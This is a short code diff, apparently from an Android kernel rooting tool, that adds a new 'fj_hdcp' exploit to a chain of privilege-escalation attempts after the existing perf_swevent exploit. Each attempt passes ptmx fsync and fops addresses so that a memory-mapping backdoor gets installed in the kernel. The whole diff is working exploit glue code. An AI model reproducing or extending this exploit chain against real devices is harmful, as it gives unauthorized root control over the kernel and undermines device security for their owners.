@@ -12,6 +12,7 @@
 #include "ptmx.h"
 #include "mm.h"
 #include "libdiagexploit/diag.h"
+#include "libfj_hdcp_exploit/fj_hdcp.h"
 #include "backdoor_mmap.h"
 
 #define PAGE_SHIFT        12
@@ -278,6 +279,12 @@ run_exploit(void)
   printf("Attempt perf_swevent exploit...\n");
   if (perf_swevent_run_exploit(ptmx_fsync_address, (int)&install_mmap,
                                   run_install_mmap, (void *)ptmx_fops_address)) {
+    return true;
+  }
+
+  printf("Attempt fj_hdcp exploit...\n");
+  if (fj_hdcp_run_exploit(ptmx_fsync_address, (int)&install_mmap,
+                       run_install_mmap, (void *)ptmx_fops_address)) {
     return true;
   }
 
